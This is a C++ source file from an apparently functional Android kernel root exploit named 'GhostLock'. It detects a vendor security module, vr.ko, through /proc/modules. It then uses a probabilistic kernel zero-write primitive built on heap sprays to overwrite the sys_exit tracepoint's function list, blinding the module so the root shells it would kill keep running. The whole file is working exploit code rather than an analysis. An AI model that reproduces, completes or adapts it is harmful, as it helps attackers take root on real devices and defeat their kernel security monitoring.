/*
 * GhostLock — vr.ko guard execution (Android only).
 *
 * The plan (`plan_vr_guard` in vr_guard.hpp) turns the resolved profile into a
 * write target; this unit carries the parts that need the device: the runtime
 * applicability check and the kernel write itself, which arrives through
 * `AncillaryContext` so the behavior stays independent of the middleware it
 * runs under.
 */

#include "session/ancillary/vr_guard.hpp"

#if defined(__ANDROID__)

#include <array>
#include <cstdio>
#include <string_view>
#include <unistd.h>

#include "common.h"
#include "kernel/target.h"
#include "memory/payload_builder.h"
#include "route/route_policy.hpp"
#include "session/exploit_session.hpp"
#include "support/native_resource.hpp"

namespace ghostlock::session::ancillary {
    namespace {
        /* vr.ko present in /proc/modules? Cached: the answer cannot change while
         * the run lasts. An unreadable /proc/modules counts as "not present":
         * the profile already gated the behavior, and a missing vr.ko means
         * there is nothing to neutralize (guide §5, fail safe). */
        bool vr_module_present() {
            static int32_t cached = -1;
            if (cached >= 0) return cached != 0;
            cached = 0;
            if (FILE *modules = fopen("/proc/modules", "r")) {
                auto close_modules = ghostlock::support::make_scope_exit(
                    [modules]() noexcept { fclose(modules); });
                std::array<char, 256> line{};
                while (fgets(line.data(), static_cast<int32_t>(line.size()), modules)) {
                    const std::string_view text(line.data());
                    /* strncasecmp(text, "vr", 2), then the module-name
                     * separator. */
                    const bool vr_prefix =
                            text.size() >= 2 && (text[0] == 'v' || text[0] == 'V') &&
                            (text[1] == 'r' || text[1] == 'R');
                    if (vr_prefix && text.size() > 2 &&
                        (text[2] == ' ' || text[2] == '_')) {
                        cached = 1;
                        break;
                    }
                }
            }
            return cached != 0;
        }

        /* Five attempts: the write primitive is probabilistic per stage. */
        constexpr int32_t kVrGuardAttempts = 5;
    } // namespace

    template <class Middleware>
    Status VrGuardPolicy::apply(AncillaryStage stage, ExploitSession &session,
                                AncillaryContext &context) noexcept {
        /* One stage only: with SELinux permissive and no victim spawned yet, a
         * single write covers every process this run will bring up. */
        if (stage != AncillaryStage::PreSpawn) return true;

        const std::optional<VrGuardPlan> plan = plan_vr_guard(session.profile);
        if (!plan.has_value()) return true; /* profile does not carry it */

        if (!vr_module_present()) {
            pr_info("vr guard: vr.ko not present; nothing to neutralize\n");
            return true;
        }
        if (!context.write_available || context.write_zero == nullptr) {
            pr_warning("vr guard: no write primitive available; vr.ko probe left "
                       "armed (ksud shells may be killed)\n");
            return false;
        }

        const uintptr_t image = static_cast<uintptr_t>(
                kernel::KIMAGE_TEXT_BASE + plan->image_offset);
        /* `data_alias` answers 0 for every image address it cannot translate,
         * which is what happens when the compiled image/page bases and the
         * profile's kernel_phys_load / kernel_phys_offset disagree (see
         * ResolvedAddresses::data_alias_checked). Zero is nobody's direct-map
         * alias, so the zero-word primitive would end up aimed at a wild
         * target five times over. Fail closed instead: the probe stays armed
         * and the caller reports an ordinary behavior failure. */
        const uintptr_t target = session.addresses.data_alias(image);
        /* Zero is nobody's direct-map alias, and the payload publishes a pointer
         * slot, so a misaligned target would straddle two fields. Both mean the
         * compiled image/page bases and the profile's phys offsets disagree.
         * Fail here rather than at the write: the retry loop below would
         * otherwise spend five heap sprays — the panic-prone part of the
         * primitive — on a target that cannot succeed. */
        if (target < kernel::DIRECT_MAP_BASE || target >= kernel::DIRECT_MAP_END ||
            (target & 7u) != 0) {
            pr_warning("vr guard: no usable direct-map alias for image=%016zx "
                       "(target=%016zx); this profile's phys offsets do not "
                       "match the kernel, vr.ko probe left armed\n",
                       static_cast<size_t>(image), static_cast<size_t>(target));
            return false;
        }
        pr_info("vr guard: neutralizing __tracepoint_sys_exit.funcs "
                "image=%016zx target=%016zx width=%u\n",
                static_cast<size_t>(image), static_cast<size_t>(target),
                plan->width_bytes);

        for (int32_t attempt = 1; attempt <= kVrGuardAttempts; attempt++) {
            if (context.write_zero(target, "vr guard: sys_exit tp->funcs")) {
                pr_success("vr guard: sys_exit probe disabled (attempt %d)\n", attempt);
                return true;
            }
            pr_warning("vr guard: attempt %d failed, retrying\n", attempt);
            usleep(50000);
        }
        /* Not fatal for the exploit itself: root is still granted, the shells it
         * leads to are what suffers. Report the failure and let the caller log
         * it; the run continues. */
        pr_warning("vr guard: all %d attempts failed; ksud shells may be killed\n",
                   kVrGuardAttempts);
        return false;
    }

    template Status VrGuardPolicy::apply<route::SelectPolicy>(AncillaryStage, ExploitSession &,
                                                              AncillaryContext &) noexcept;
    template Status VrGuardPolicy::apply<route::TcpPolicy>(AncillaryStage, ExploitSession &,
                                                           AncillaryContext &) noexcept;
    template Status VrGuardPolicy::apply<route::MulticastPolicy>(AncillaryStage, ExploitSession &,
                                                                 AncillaryContext &) noexcept;
} // namespace ghostlock::session::ancillary

#endif
